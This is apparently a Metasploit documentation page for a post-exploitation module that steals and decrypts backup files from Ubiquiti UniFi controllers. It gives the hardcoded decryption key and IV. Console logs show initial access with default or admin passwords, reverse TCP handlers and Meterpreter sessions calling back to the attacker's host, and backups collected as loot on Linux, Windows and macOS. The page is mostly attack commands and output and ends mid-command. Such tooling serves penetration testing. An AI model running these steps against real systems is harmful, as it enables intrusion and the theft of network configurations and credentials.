{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/gather/ubiquiti_unifi_backup","result":{"data":{"moduleMetadataJson":{"id":"e67100f6-a92c-501c-ad85-3ca4162ffd35","name":"Multi Gather Ubiquiti UniFi Controller Backup","fullname":"post/multi/gather/ubiquiti_unifi_backup","description":"On an Ubiquiti UniFi controller, reads the system.properties configuration file\n        and downloads the backup and autobackup files.  The files are then decrypted using\n        a known encryption key, then attempted to be repaired by zip.  Meterpreter must be\n        used due to the large file sizes, which can be flaky on regular shells to read.\n        Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more.\n        If the zip can be repaired, the db and its information will be extracted.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/gather/ubiquiti_unifi_backup","documentationSlug":"/modules/documentation/post/multi/gather/ubiquiti_unifi_backup"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module works against UniFi Network Controller (<code class=\"language-text\">5.10.19</code>-<code class=\"language-text\">5.10.23</code> confirmed, most likely others), to download any backup and\nautobackup files (.unf extension).  These files are AES encrypted zip files which use the IV <code class=\"language-text\">ubntenterpriseap</code> and\nkey <code class=\"language-text\">bcyangkmluohmars</code>.  The unf zip file is then decrypted, however it contains an error in the file.  Utilizing\n<code class=\"language-text\">zip -FF</code> the file can be repaired and opened (some reports say 7zip can open the errored file).  If <code class=\"language-text\">zip</code> is\navailable on the system, this operation is performed and the result saved to loot as well.</p>\n<p>  Due to the potential large file sizes of the backups, meterpreter is greatly encouraged over a shell.</p>\n<p>  This work is based on zhangyoufu's <a href=\"https://github.com/zhangyoufu/unifi-backup-decrypt\">unifi-backup-decrypt</a>\nand justingist's <a href=\"https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1\">POSH-Ubiquiti</a>.  </p>\n<p>  The unf file has the following actions performed:</p>\n<ol>\n<li>Decrypt the file</li>\n<li>Fix the zip file if a <code class=\"language-text\">zip</code> utility is on the system</li>\n<li>Extract db.gz</li>\n<li>Unzip the db file</li>\n<li>Import the db file</li>\n</ol>\n<h3 id=\"install-instructions\" style=\"position:relative;\"><a href=\"#install-instructions\" aria-label=\"install instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Instructions</h3>\n<ol>\n<li>Download the file from <a href=\"https://www.ui.com/download/unifi\">https://www.ui.com/download/unifi</a> (Java required on Windows)</li>\n<li>Install with default parameters</li>\n<li>Login to <code class=\"language-text\">https://localhost:8443/manage</code> and click the gear icon in the bottom left</li>\n<li>Select <code class=\"language-text\">Maintenance</code> then click <code class=\"language-text\">DOWNLOAD BACKUP</code> to create the backup file.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Get a shell</li>\n<li>Do: <code class=\"language-text\">use post/multi/gather/ubiquiti_unifi_backup</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubiquiti-unifi-controller-51019-build-atag5101911646-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#ubiquiti-unifi-controller-51019-build-atag5101911646-on-ubuntu-1804\" aria-label=\"ubiquiti unifi controller 51019 build atag5101911646 on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubiquiti Unifi Controller 5.10.19 (Build: atag<em>5.10.19</em>11646) on Ubuntu 18.04</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing unifi.rb for ERB directives.\nresource (unifi.rb)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (unifi.rb)&gt; set username unifi\nusername =&gt; unifi\nresource (unifi.rb)&gt; set password unifi\npassword =&gt; unifi\nresource (unifi.rb)&gt; set rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nresource (unifi.rb)&gt; run\n[+] 2.2.2.2:22 - Success: &#39;unifi:unifi&#39; &#39;uid=1000(unifi) gid=1000(unifi) groups=1000(unifi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare) Linux unifi 4.18.0-16-generic #17~18.04.1-Ubuntu SMP Tue Feb 12 13:35:51 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 1 opened (1.1.1.1:33389 -&gt; 2.2.2.2:22) at 2019-03-10 15:58:18 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nresource (unifi.rb)&gt; sessions -u 1\n[*] Executing &#39;post/multi/manage/shell_to_meterpreter&#39; on session(s): [1]\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 1.1.1.1:4433 \n[*] Sending stage (985320 bytes) to 2.2.2.2\n[*] Meterpreter session 2 opened (1.1.1.1:4433 -&gt; 2.2.2.2:37124) at 2019-03-10 15:58:25 -0400\n[*] Command stager progress: 100.00% (773/773 bytes)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"module\" style=\"position:relative;\"><a href=\"#module\" aria-label=\"module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (unifi.rb)&gt; use post/multi/gather/ubiquiti_unifi_backup\nresource (unifi.rb)&gt; set verbose true\nverbose =&gt; true\nresource (unifi.rb)&gt; set session 2\nsession =&gt; 2\nresource (unifi.rb)&gt; run\n\n[*] File /var/lib/unifi/system.properties saved to /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt\n[+] Read UniFi Controller file /var/lib/unifi/system.properties\n[-] Directory doesn&#39;t exist: /data/autobackup\n[+] Found backup folder: /var/lib/unifi/backup\n[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf\n[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip.  File needs to be repair via `zip -FF`\n[*] Attempting to repair zip file (this is normal)\n[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"details\" style=\"position:relative;\"><a href=\"#details\" aria-label=\"details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Details</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(multi/gather/ubiquiti_unifi_backup) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000\nmeterpreter &gt; sysinfo\nComputer     : 2.2.2.2\nOS           : Ubuntu 18.04 (Linux 4.18.0-16-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; background\n[*] Backgrounding session 2...\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; loot\n\nLoot\n====\n\nhost           service  type                                      name                                                          content          info                                                   path\n----           -------  ----                                      ----                                                          -------          ----                                                   ----\n2.2.2.2                 ubiquiti.system.properties                /var/lib/unifi/system.properties                              text/plain                                                              /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt\n2.2.2.2                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf\n2.2.2.2                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip\n2.2.2.2                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ubiquiti-unifi-controller-51019-build-atag5101911646-on-windows-2012\" style=\"position:relative;\"><a href=\"#ubiquiti-unifi-controller-51019-build-atag5101911646-on-windows-2012\" aria-label=\"ubiquiti unifi controller 51019 build atag5101911646 on windows 2012 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubiquiti Unifi Controller 5.10.19 (Build: atag<em>5.10.19</em>11646) on Windows 2012</h3>\n<h4 id=\"initial-access-1\" style=\"position:relative;\"><a href=\"#initial-access-1\" aria-label=\"initial access 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing unifi.rb for ERB directives.\nresource (unifi.rb)&gt; use exploit/windows/smb/psexec\nresource (unifi.rb)&gt; set smbpass Password123\nsmbpass =&gt; Password123\nresource (unifi.rb)&gt; set smbuser Administrator\nsmbuser =&gt; Administrator\nresource (unifi.rb)&gt; set rhosts 4.4.4.4\nrhosts =&gt; 4.4.4.4\nresource (unifi.rb)&gt; run\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] 4.4.4.4:445 - Connecting to the server...\n[*] 4.4.4.4:445 - Authenticating to 4.4.4.4:445 as user &#39;Administrator&#39;...\n[*] 4.4.4.4:445 - Selecting PowerShell target\n[*] 4.4.4.4:445 - Executing the payload...\n[+] 4.4.4.4:445 - Service start timed out, OK if running a command or non-service executable...\n[*] Sending stage (179779 bytes) to 4.4.4.4\n[*] Meterpreter session 3 opened (1.1.1.1:4444 -&gt; 4.4.4.4:61034) at 2019-03-10 15:58:32 -0400\n\nmeterpreter &gt; background\n[*] Backgrounding session 3...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"module-1\" style=\"position:relative;\"><a href=\"#module-1\" aria-label=\"module 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (unifi.rb)&gt; use post/multi/gather/ubiquiti_unifi_backup\nresource (unifi.rb)&gt; set verbose true\nverbose =&gt; true\nresource (unifi.rb)&gt; set session 3\nsession =&gt; 3\nresource (unifi.rb)&gt; run\n[*] File C:\\Users\\Administrator\\Ubiquiti UniFi\\data\\system.properties saved to /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt\n[+] Read UniFi Controller file C:\\Users\\Administrator\\Ubiquiti UniFi\\data\\system.properties\n[+] Found backup folder: C:\\Users\\Administrator\\Ubiquiti Unifi\\data\\backup\n[+] File C:\\Users\\Administrator\\Ubiquiti Unifi\\data\\backup/5.10.19.unf saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf\n[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip.  File needs to be repair via `zip -FF`\n[*] Attempting to repair zip file (this is normal)\n[+] File C:\\Users\\Administrator\\Ubiquiti Unifi\\data\\backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip.\n[*] Post module execution completed\n[*] Starting persistent handler(s)...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"details-1\" style=\"position:relative;\"><a href=\"#details-1\" aria-label=\"details 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Details</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(multi/gather/ubiquiti_unifi_backup) &gt; sessions -i 3\n[*] Starting interaction with 3...\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-OBKF2JFCDKL\nOS              : Windows 2012 (Build 9200).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt; background\n[*] Backgrounding session 3...\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; loot\n\nLoot\n====\n\nhost           service  type                                      name                                                          content          info                                                   path\n----           -------  ----                                      ----                                                          -------          ----                                                   ----\n4.4.4.4                 ubiquiti.system.properties                C:\\Users\\Administrator\\Ubiquiti UniFi\\data\\system.properties  text/plain                                                              /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt\n4.4.4.4                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf\n4.4.4.4                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip\n4.4.4.4                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ubiquiti-unifi-controller-51020-on-osx-10144\" style=\"position:relative;\"><a href=\"#ubiquiti-unifi-controller-51020-on-osx-10144\" aria-label=\"ubiquiti unifi controller 51020 on osx 10144 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubiquiti Unifi Controller 5.10.20 on OSX 10.14.4</h3>\n<h4 id=\"module-2\" style=\"position:relative;\"><a href=\"#module-2\" aria-label=\"module 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(multi/gather/ubiquiti_unifi_backup) &gt; rexploit\n[*] Reloading module...\n\n[+] Read UniFi Controller file /Users/unifi/Library/Application Support/Unifi/data/system.properties\n[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_683102.unf\n[+] File 5.10.20.unf DECRYPTED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_122303.zip.  File needs to be repair via `zip -FF`\n[*] Attempting to repair zip file (this is normal)\n[+] File /Users/unifi/Library/Application Support/UniFi/data/backup/5.10.20.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190406110342_default_1.1.1.1_ubiquiti.unifi.b_728913.zip.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"using-a-shell-with-multiple-larger-backups-on-ubiquiti-unifi-controller-51023\" style=\"position:relative;\"><a href=\"#using-a-shell-with-multiple-larger-backups-on-ubiquiti-unifi-controller-51023\" aria-label=\"using a shell with multiple larger backups on ubiquiti unifi controller 51023 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a SHELL With Multiple Larger Backups on Ubiquiti Unifi Controller 5.10.23</h3>\n<p>An example of the output when not utilizing meterpreter (just a shell) to access the files.  The solution is to upgrade to meterpreter, which will\nwork successfully.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(multi/gather/ubiquiti_unifi_backup) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                   Information                                               Connection\n  --  ----  ----                   -----------                                               ----------\n  1         shell linux            SSH unifi:unifi (1.1.1.1:22)                              2.2.2.2:35125 -&gt; 1.1.1.1:22 (1.1.1.1)\n  2         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 1.1.1.1        2.2.2.2:4433 -&gt; 1.1.1.1:52584 (1.1.1.1)\n\nmsf5 post(multi/gather/ubiquiti_unifi_backup) &gt; session -i 1\nl[-] Unknown command: 